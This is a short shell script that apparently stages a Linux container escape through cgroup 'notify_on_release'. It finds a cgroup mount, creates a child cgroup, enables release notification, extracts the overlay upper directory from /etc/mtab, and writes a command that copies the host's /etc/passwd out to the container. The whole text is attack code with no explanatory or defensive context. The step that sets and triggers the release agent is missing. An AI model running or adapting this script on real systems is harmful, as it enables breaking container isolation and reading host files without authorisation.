#!/bin/sh
rdmad=`dirname $(ls -x /s*/fs/c*/* |head -n1)`
mkdir -p $rdmad/w
echo 1 >$rdmad/w/notify_on_release
fspath=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

echo "#!/bin/sh" >$rdmad/cmd
echo "cat /etc/passwd > $fspath/out_container" >>$rdmad/cmd
chmod +x $rdmad/cmd

